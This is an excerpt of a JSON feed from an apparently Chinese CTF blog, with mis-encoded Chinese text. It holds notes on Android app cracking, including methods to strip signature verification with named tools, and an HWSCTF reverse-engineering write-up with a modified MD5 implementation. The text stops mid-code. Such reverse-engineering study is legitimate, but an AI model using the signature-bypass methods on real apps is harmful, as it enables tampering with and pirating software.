comment\">-----kill/KillProcess () å¯ä»¥æ€æ­»å½“å‰åº”ç”¨æ´»åŠ¨çš„è¿›ç¨‹ï¼Œè¿™ä¸€æ“ä½œå°†ä¼šæŠŠæ‰€æœ‰è¯¥è¿›ç¨‹å†…çš„èµ„æºï¼ˆåŒ…æ‹¬çº¿ç¨‹å…¨éƒ¨æ¸…ç†æ‰ï¼‰. å½“ç„¶ï¼Œç”±äº ActivityManager æ—¶åˆ»ç›‘å¬ç€è¿›ç¨‹ï¼Œä¸€æ—¦å‘ç°è¿›ç¨‹è¢«éæ­£å¸¸ Killï¼Œå®ƒå°†ä¼šè¯•å›¾å»é‡å¯è¿™ä¸ªè¿›ç¨‹ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆï¼Œæœ‰æ—¶å€™å½“æˆ‘ä»¬è¯•å›¾è¿™æ ·å»ç»“æŸæ‰åº”ç”¨æ—¶ï¼Œå‘ç°å®ƒåˆè‡ªåŠ¨é‡æ–°å¯åŠ¨çš„åŸå› .</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>system<span class=\"token punctuation\">.</span>exit<span class=\"token comment\">----- æ€æ­»äº†æ•´ä¸ªè¿›ç¨‹ï¼Œè¿™æ—¶å€™æ´»åŠ¨æ‰€å çš„èµ„æºä¹Ÿä¼šè¢«é‡Šæ”¾ã€‚</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>finish<span class=\"token comment\">---------- ä»…ä»…é’ˆå¯¹ Activityï¼Œå½“è°ƒç”¨ finish () æ—¶ï¼Œåªæ˜¯å°†æ´»åŠ¨æ¨å‘åå°ï¼Œå¹¶æ²¡æœ‰ç«‹å³é‡Šæ”¾å†…å­˜ï¼Œæ´»åŠ¨çš„èµ„æºå¹¶æ²¡æœ‰è¢«æ¸…ç†</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> æ‰€è°“ä¸‰è§’æ ¡éªŒï¼Œå°±æ˜¯soæ£€æµ‹dexï¼ŒåŠ¨æ€åŠ è½½çš„<span class=\"token function\">dex</span><span class=\"token punctuation\">(</span>åœ¨è½¯ä»¶è¿è¡Œæ—¶ä¼šè§£å‹é‡Šæ”¾ä¸€æ®µdexæ–‡ä»¶ï¼Œæ£€æµ‹å®Œåå°±åˆ é™¤<span class=\"token punctuation\">)</span>æ£€æµ‹soï¼Œdexæ£€æµ‹åŠ¨æ€åŠ è½½çš„dex</pre></td></tr></table></figure><h2 id=\"ç­¾åæ ¡éªŒå¯¹æŠ—\"><a class=\"markdownIt-Anchor\" href=\"#ç­¾åæ ¡éªŒå¯¹æŠ—\">#</a> ç­¾åæ ¡éªŒå¯¹æŠ—</h2>\n<p>æ–¹æ³•ä¸€ï¼šæ ¸å¿ƒç ´è§£æ’ä»¶ï¼Œä¸ç­¾åå®‰è£…åº”ç”¨<br>\næ–¹æ³•äºŒï¼šä¸€é”®è¿‡ç­¾åå·¥å…·ï¼Œä¾‹å¦‚ MTã€NPã€ARMProã€CNFIXã€Modex çš„å»é™¤ç­¾åæ ¡éªŒåŠŸèƒ½<br>\næ–¹æ³•ä¸‰ï¼šå…·ä½“åˆ†æç­¾åæ ¡éªŒé€»è¾‘ (æ‰‹æ’•ç­¾åæ ¡éªŒ)</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/20/HWSCTF-WP/",
            "url": "https://3cly.github.io/2023/07/20/HWSCTF-WP/",
            "title": "HWSCTF_WP",
            "date_published": "2023-07-20T15:24:20.000Z",
            "content_html": "<h1 id=\"hwsctf\"><a class=\"markdownIt-Anchor\" href=\"#hwsctf\">#</a> HWSCTF</h1>\n<p>æ²¡æœ‰å®˜æ–¹ WPğŸ’¢ğŸ˜ </p>\n<p>å‡ºäº†ä¸€é“ animals, å¦å¤–ä¸¤é“æ˜¯èµ›åçœ‹å¤§ä½¬ WP å¤ç°çš„ï¼Œä¸€é“å®‰å“ä¸€é“æµé‡åˆ†æ <s>ä¸»è¦æ˜¯å¤ªæ‘†äº†â€¦</s></p>\n<h2 id=\"animals\"><a class=\"markdownIt-Anchor\" href=\"#animals\">#</a> Animals</h2>\n<p><img data-src=\"/images/image-20230715091543873.png\" alt=\"image-20230715091543873\"></p>\n<p><img data-src=\"/images/image-20230715093301804.png\" alt=\"image-20230715093301804\"></p>\n<p><img data-src=\"/images/image-20230715094922589.png\" alt=\"image-20230715094922589\"></p>\n<p>å»èŠ±æŒ‡ä»¤</p>\n<p><img data-src=\"/images/image-20230715161145193.png\" alt=\"image-20230715161145193\"></p>\n<p><img data-src=\"/images/image-20230716122739861.png\" alt=\"image-20230716122739861\"></p>\n<p><img data-src=\"/images/image-20230716124344765.png\" alt=\"image-20230716124344765\"></p>\n<p><img data-src=\"/images/image-20230716190031257.png\" alt=\"image-20230716190031257\"></p>\n<p><img data-src=\"/images/image-20230716190118487.png\" alt=\"image-20230716190118487\"></p>\n<p>[+] Dump 0x608090 - 0x60809F (16 bytes) :</p>\n<p>[0xDD, 0xB2, 0x6D, 0xF3, 0xE6, 0x0A, 0xC7, 0x83, 0x4A, 0x93, 0x50, 0xB4, 0xA4, 0x59, 0xAB, 0x0E]</p>\n<p>é­”æ”¹å“ˆå¸Œç®—æ³•</p>\n<p><img data-src=\"/images/image-20230716154457847.png\" alt=\"image-20230716154457847\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;memory.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"md5.h\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> PADDING<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                         <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                         <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                         <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                         </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Init</span><span class=\"token punctuation\">(</span>MD5_CTX <span class=\"token operator\">*</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>     context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>     context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xEFCDAB89</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x67452301</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>     context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x10325476</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>     context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x98BADCFE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Update</span><span class=\"token punctuation\">(</span>MD5_CTX <span class=\"token operator\">*</span>context<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> inputlen<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>partlen <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    partlen <span class=\"token operator\">=</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> index<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> inputlen <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>inputlen <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>       context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> inputlen <span class=\"token operator\">>></span> <span class=\"token number\">29</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>inputlen <span class=\"token operator\">>=</span> partlen<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>       <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>context<span class=\"token operator\">-></span>buffer<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>input<span class=\"token punctuation\">,</span>partlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>       <span class=\"token function\">MD5Transform</span><span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">,</span>context<span class=\"token operator\">-></span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>       <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> partlen<span class=\"token punctuation\">;</span>i<span class=\"token operator\">+</span><span class=\"token number\">64</span> <span class=\"token operator\">&lt;=</span> inputlen<span class=\"token punctuation\">;</span>i<span class=\"token operator\">+=</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>           <span class=\"token function\">MD5Transform</span><span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>       index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>context<span class=\"token operator\">-></span>buffer<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>inputlen<span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Final</span><span class=\"token punctuation\">(</span>MD5_CTX <span class=\"token operator\">*</span>context<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> digest<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>padlen <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> bits<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    padlen <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>index <span class=\"token operator\">&lt;</span> <span class=\"token number\">56</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">(</span><span class=\"token number\">56</span><span class=\"token operator\">-</span>index<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token operator\">-</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token function\">MD5Encode</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">,</span>context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token function\">MD5Update</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">,</span>PADDING<span class=\"token punctuation\">,</span>padlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token function\">MD5Update</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">,</span>bits<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token function\">MD5Encode</span><span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">,</span>context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>output<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>         output<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>         output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>         output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>         output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>         i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>         j<span class=\"token operator\">+=</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Decode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>output<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>     <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>     <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>           output<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                       <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>                       <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                       <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>           i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>           j<span class=\"token operator\">+=</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"77\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Transform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> block<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> state<span class=\"token 